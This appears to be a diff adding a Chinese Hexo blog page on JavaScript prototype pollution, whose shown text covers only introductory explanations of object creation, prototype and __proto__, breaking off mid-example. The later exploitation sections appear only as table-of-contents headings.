@@ -1,0 +1,941 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    JS原型链污染 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="学习JavaScript这一篇就够了-CSDN博客 js学习 js原型链污染（原理+分析+例题） - 知乎 JavaScript 原型链污染 | Drunkbaby’s Blog(推荐)  JS创建对象 有三种方式： 12345678910111213141516&#x2F;&#x2F;普通方式var a &#x3D; &#123;name:&#x27;pan&#x27;,age:19&#125;;&#x2F;&#x2F;构造函数方式functi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JS原型链污染">
+<meta property="og:url" content="http://example.com/2025/04/11/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="学习JavaScript这一篇就够了-CSDN博客 js学习 js原型链污染（原理+分析+例题） - 知乎 JavaScript 原型链污染 | Drunkbaby’s Blog(推荐)  JS创建对象 有三种方式： 12345678910111213141516&#x2F;&#x2F;普通方式var a &#x3D; &#123;name:&#x27;pan&#x27;,age:19&#125;;&#x2F;&#x2F;构造函数方式functi">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/04/11/images/20250414203420323.png">
+<meta property="og:image" content="http://example.com/2025/04/11/images/20250415142554101.png">
+<meta property="og:image" content="http://example.com/2025/04/11/images/20250415142950087.png">
+<meta property="og:image" content="http://example.com/2025/04/11/images/20250415143137670.png">
+<meta property="og:image" content="c:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250415143407401.png">
+<meta property="og:image" content="http://example.com/2025/04/11/images/20250415144843768.png">
+<meta property="og:image" content="http://example.com/2025/04/11/images/20250415144923178.png">
+<meta property="og:image" content="http://example.com/2025/04/11/images/20250415150855244.png">
+<meta property="og:image" content="http://example.com/2025/04/11/images/20250617214453761.png">
+<meta property="og:image" content="http://example.com/2025/04/11/images/20250617215437545.png">
+<meta property="og:image" content="http://example.com/2025/04/11/images/20250617215503766.png">
+<meta property="og:image" content="http://example.com/2025/04/11/images/20250617215533119.png">
+<meta property="og:image" content="http://example.com/2025/04/11/images/20250617215619834.png">
+<meta property="article:published_time" content="2025-04-11T06:10:26.000Z">
+<meta property="article:modified_time" content="2026-04-18T07:45:46.396Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="JS原型链污染">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/04/11/images/20250414203420323.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture></picture>
+    <img fetchpriority="high" src="/../images/17373827994914.jpg" alt="JS原型链污染">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">JS原型链污染</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#js%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.</span> <span class="toc-text"> JS创建对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#js%E5%8E%9F%E5%9E%8B"><span class="toc-number">2.</span> <span class="toc-text"> JS原型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">2.1.</span> <span class="toc-text"> 基本概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#__proto__%E5%92%8Cprototype"><span class="toc-number">2.2.</span> <span class="toc-text"> __proto__和prototype</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-prototype%E6%98%BE%E5%BC%8F%E5%8E%9F%E5%9E%8B"><span class="toc-number">2.2.1.</span> <span class="toc-text"> 1. prototype（显式原型）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-__proto__%E9%9A%90%E5%BC%8F%E5%8E%9F%E5%9E%8B"><span class="toc-number">2.2.2.</span> <span class="toc-text"> 2. __proto__（隐式原型）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.2.3.</span> <span class="toc-text"> 总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#js%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text"> JS原型链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#js%E4%B8%AD%E7%B1%BB%E7%9A%84%E7%BB%A7%E6%89%BF%E6%9C%BA%E5%88%B6"><span class="toc-number">3.1.</span> <span class="toc-text"> JS中类的继承机制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%80%9D%E8%B7%AF"><span class="toc-number">4.</span> <span class="toc-text"> 漏洞思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">4.1.</span> <span class="toc-text"> 原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text"> 利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">5.</span> <span class="toc-text"> 例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#js%E5%A4%A7%E5%B0%8F%E5%86%99%E7%89%B9%E6%80%A7"><span class="toc-number">5.1.</span> <span class="toc-text"> JS大小写特性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass"><span class="toc-number">6.</span> <span class="toc-text"> Bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E5%AF%BC%E8%87%B4%E7%9A%84ejs%E6%A8%A1%E6%9D%BFrce"><span class="toc-number">7.</span> <span class="toc-text"> 污染导致的ejs模板rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gkctf-2021easynode-extend%E5%AF%BC%E8%87%B4%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">7.1.</span> <span class="toc-text"> [GKCTF 2021]easynode （extend导致原型链污染）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#key%E7%9A%84%E5%80%BC"><span class="toc-number">7.1.1.</span> <span class="toc-text"> key的值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#username%E7%9A%84%E5%80%BC"><span class="toc-number">7.1.2.</span> <span class="toc-text"> username的值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">7.1.3.</span> <span class="toc-text"> 添加管理员</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93"><span class="toc-number">7.1.4.</span> <span class="toc-text"> 污染</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ejs%E5%92%8Cjade%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8Erce"><span class="toc-number">8.</span> <span class="toc-text"> EJS和Jade模板引擎RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lodash-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">9.</span> <span class="toc-text"> Lodash 原型链污染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefsafe%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">10.</span> <span class="toc-text"> undefsafe原型链污染</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-JS原型链污染" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/04/11/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-04-11T06:10:26.000Z" itemprop="datePublished">2025-04-11</time>
+    <time style="display: none;" id="post-update-time">2026-04-18</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/" data-aos="zoom-in">知识点</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38490457/article/details/109257751?spm=1001.2014.3001.5506">学习JavaScript这一篇就够了-CSDN博客</a></p>
+<p>js学习</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/690650551">js原型链污染（原理+分析+例题） - 知乎</a></p>
+<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/12/29/JavaScript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/#0x03-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93">JavaScript 原型链污染 | Drunkbaby’s Blog</a>(推荐)</p>
+<h2 id="js创建对象"><a class="markdownIt-Anchor" href="#js创建对象"></a> JS创建对象</h2>
+<p>有三种方式：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//普通方式</span></span><br><span class="line"><span class="keyword">var</span> a = &#123;<span class="attr">name</span>:<span class="string">&#x27;pan&#x27;</span>,<span class="attr">age</span>:<span class="number">19</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造函数方式</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&#x27;pan&#x27;</span>;<span class="comment">// 实例属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = <span class="number">19</span>;</span><br><span class="line">&#125;</span><br><span class="line">a.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">name</span> = <span class="string">&#x27;wang&#x27;</span>; <span class="comment">// 原型属性</span></span><br><span class="line">b = <span class="keyword">new</span> <span class="title function_">a</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(web.<span class="property">name</span>);<span class="comment">//调用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//object方式</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">a.<span class="property">name</span> = <span class="string">&#x27;pan&#x27;</span>;</span><br><span class="line">a.<span class="property">age</span> = <span class="number">19</span>;</span><br></pre></td></tr></table></figure>
+<p>在js中所有的东西都可看为对象</p>
+<p>而在js中每一个对象都会有一个**<strong>proto</strong>**的属性。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__proto__</span><br><span class="line">对象可以通过__proto__来找到其自己的父类。</span><br></pre></td></tr></table></figure>
+<p>而对于构造函数也有一个<strong>prototype</strong>与之相对应。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">prototype</span><br><span class="line">构造函数.prototype也是一个对象，为构造函数的原型对象。</span><br></pre></td></tr></table></figure>
+<p>在上述例子中</p>
+<ul>
+<li><code>a.prototype</code> 是一个对象，所有通过 <code>new a()</code> 创建的实例（如 <code>b</code>）会继承它的属性。</li>
+<li>如果实例自身没有某个属性，JavaScript 会去 <code>a.prototype</code> 上查找（原型链）。</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="keyword">new</span> <span class="title function_">a</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b.<span class="property">name</span>);</span><br></pre></td></tr></table></figure>
+<ol>
+<li>
+<p><code>new a()</code> 会创建一个新对象 <code>b</code>，并执行 <code>a</code> 构造函数：</p>
+<ul>
+<li><code>b.name = 'pan'</code>（直接赋给实例）。</li>
+<li><code>b.age = 19</code>。</li>
+</ul>
+</li>
+<li>
+<p><code>b</code> 的原型是 <code>a.prototype</code>（包含 <code>name: 'wang'</code>）。</p>
+</li>
+<li>
+<p><strong>属性查找规则</strong>：</p>
+<ul>
+<li>先检查实例自身是否有 <code>name</code>（有，值为 <code>'pan'</code>），<strong>不会</strong>继续查找原型链。</li>
+<li>所以 <code>console.log(b.name)</code> 输出 <code>'pan'</code>。</li>
+</ul>
+ <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">b</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;pan&#x27;</span>,     <span class="comment">// 实例自身属性</span></span><br><span class="line">    <span class="attr">age</span>: <span class="number">19</span>,</span><br><span class="line">    <span class="attr">__proto__</span>: a.<span class="property"><span class="keyword">prototype</span></span> → &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;wang&#x27;</span>, <span class="comment">// 原型属性</span></span><br><span class="line">        <span class="attr">constructor</span>: <span class="title function_">a</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="js原型"><a class="markdownIt-Anchor" href="#js原型"></a> JS原型</h2>
+<h3 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h3>
+<p>自我理解是和python的ssti继承差不多</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">官方解释</span><br><span class="line">在JavaScript中，每个对象都有一个原型，它是一个指向另一个对象的引用。当我们访问一个对象的属性时，如果该对象没有这个属性，JavaScript引擎会在它的原型对象中查找这个属性。这个过程会一直持续，直到找到该属性或者到达原型链的末尾。</span><br></pre></td></tr></table></figure>
+<p>函数都有 <code>prototype</code> 属性，称之为<strong>原型</strong>，也称为原型对象，原型对象里面<strong>可以存放属性和方法</strong>，共享给实例对象使用，用于实现继承效果。</p>
+<h3 id="__proto__和prototype"><a class="markdownIt-Anchor" href="#__proto__和prototype"></a> __proto__和prototype</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在JavaScript中，每个对象都有一个名为__proto__的内置属性，它指向该对象的原型。</span><br><span class="line">同时，每个函数也都有一个名为 prototype 的属性，它是一个对象，包含构造函数的原型对象应该具有的属性和方法。</span><br><span class="line">简单来说，__proto__ 属性是指向该对象的原型，而 prototype属性是用于创建该对象的构造函数的原型。</span><br></pre></td></tr></table></figure>
+<h4 id="1-prototype显式原型"><a class="markdownIt-Anchor" href="#1-prototype显式原型"></a> <strong>1. <code>prototype</code>（显式原型）</strong></h4>
+<p><strong>定义</strong></p>
+<ul>
+<li><strong><code>prototype</code> 是函数（构造函数）特有的属性</strong>，用于定义由该函数创建的实例的共享属性和方法。</li>
+<li>只有 <strong>函数</strong> 才有 <code>prototype</code>（普通对象没有）。</li>
+<li>默认情况下，<code>prototype</code> 是一个包含 <code>constructor</code> 属性的对象，指向函数本身。</li>
+</ul>
+<p><strong>作用</strong></p>
+<ul>
+<li>用于 <strong>实现继承</strong>，让所有实例共享方法和属性。</li>
+<li>通过 <code>new</code> 创建实例时，实例的 <code>__proto__</code> 会指向构造函数的 <code>prototype</code>。</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 在 prototype 上添加方法</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayHello</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hello, <span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>!`</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> alice = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Alice&quot;</span>);</span><br><span class="line">alice.<span class="title function_">sayHello</span>(); <span class="comment">// &quot;Hello, Alice!&quot;（方法来自 prototype）</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Dog</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 所有 Dog 实例共享 bark 方法</span></span><br><span class="line"><span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">bark</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Woof!&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> dog1 = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;Buddy&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> dog2 = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;Max&quot;</span>);</span><br><span class="line">dog1.<span class="title function_">bark</span>(); <span class="comment">// &quot;Woof!&quot;（方法来自原型）</span></span><br></pre></td></tr></table></figure>
+<h4 id="2-__proto__隐式原型"><a class="markdownIt-Anchor" href="#2-__proto__隐式原型"></a> <strong>2. <code>__proto__</code>（隐式原型）</strong></h4>
+<p><strong>定义</strong></p>
+<ul>
+<li><strong><code>__proto__</code> 是实例对象的属性</strong>，指向它的构造函数的 <code>prototype</code>。</li>
+<li><strong>所有对象（包括函数）都有 <code>__proto__</code></strong>，它构成了 JavaScript 的 <strong>原型链</strong>。</li>
+<li><code>__proto__</code> 是 <strong>非标准属性</strong>（但被大多数浏览器支持），现代代码应该用 <code>Object.getPrototypeOf(obj)</code> 替代。</li>
+</ul>
+<p><strong>作用</strong></p>
+<ul>
+<li>用于 <strong>查找属性和方法</strong>：
+<ul>
+<li>如果对象自身没有某个属性，JavaScript 会沿着 <code>__proto__</code> 向上查找，直到 <code>null</code>（原型链顶端）。</li>
+</ul>
+</li>
+<li>通过 <code>__proto__</code> 可以 <strong>手动修改对象的原型</strong>（不推荐，影响性能）。</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">__proto__</span> === <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> arr = [];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr.<span class="property">__proto__</span> === <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
+<h4 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> <strong>总结</strong></h4>
+<ul>
+<li><strong><code>prototype</code></strong>：函数的属性，用于定义实例共享的成员。</li>
+<li><strong><code>__proto__</code></strong>：对象的属性，指向其构造函数的 <code>prototype</code>，构成原型链。</li>
+<li><strong><code>prototype</code> 是爸爸的蓝图，<code>__proto__</code> 是儿子找爸爸的路径</strong>。</li>
+</ul>
+<h2 id="js原型链"><a class="markdownIt-Anchor" href="#js原型链"></a> JS原型链</h2>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=<span class="number">1</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">__proto__</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">__proto__</span>.<span class="property">__proto__</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">__proto__</span>.<span 